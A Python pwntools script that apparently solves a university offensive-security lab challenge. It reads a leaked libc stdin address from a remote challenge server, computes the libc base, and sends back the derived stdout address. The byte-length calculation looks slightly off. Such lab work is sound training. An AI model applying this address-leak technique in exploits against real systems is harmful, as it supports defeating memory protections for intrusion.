from pwn import *

context.log_level = "info"

LOCAL = False

if LOCAL:
    p = process("./glibc_files/glibc")
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1236)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./glibc_files/libc.so.6"

# Extract the given address from the message and read up until expected input
print(p.recvuntil(b"note: ").decode())
_IO_2_1_stdin__address_raw = p.recvline().strip()
print(p.recvuntil(b">").decode())
print("_IO_2_1_stdin__address raw", _IO_2_1_stdin__address_raw)
_IO_2_1_stdin__address = int.from_bytes(_IO_2_1_stdin__address_raw, byteorder="little")
print("_IO_2_1_stdin_ address", hex(_IO_2_1_stdin__address))

# Open Shared library to get offset addresses
e = ELF(libc)

# Get source offset
_IO_2_1_stdin__offset = e.symbols["_IO_2_1_stdin_"]
print("_IO_2_1_stdin_ offset", hex(_IO_2_1_stdin__offset))

# Compute the base address from the offset and the given address (base = address - offset)
base_address = _IO_2_1_stdin__address - _IO_2_1_stdin__offset
print("base address", hex(base_address))

# Get the offset for the target address
_IO_2_1_stdout__offset = e.symbols["_IO_2_1_stdout_"]
print("_IO_2_1_stdout_ offset", hex(_IO_2_1_stdout__offset))

# Compute the target address (address = base + offset)
_IO_2_1_stdout__address = base_address + _IO_2_1_stdout__offset
print("_IO_2_1_stdout_ address", hex(_IO_2_1_stdout__address))

# This challenge required raw bytes
_IO_2_1_stdout__address_raw = _IO_2_1_stdout__address.to_bytes((_IO_2_1_stdout__address.bit_length() + 7) // 4,
                                                               byteorder='little')
print("_IO_2_1_stdout_ address raw", _IO_2_1_stdout__address_raw)

# Send the answer
p.sendline(_IO_2_1_stdout__address_raw)

# Reap the rewards
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
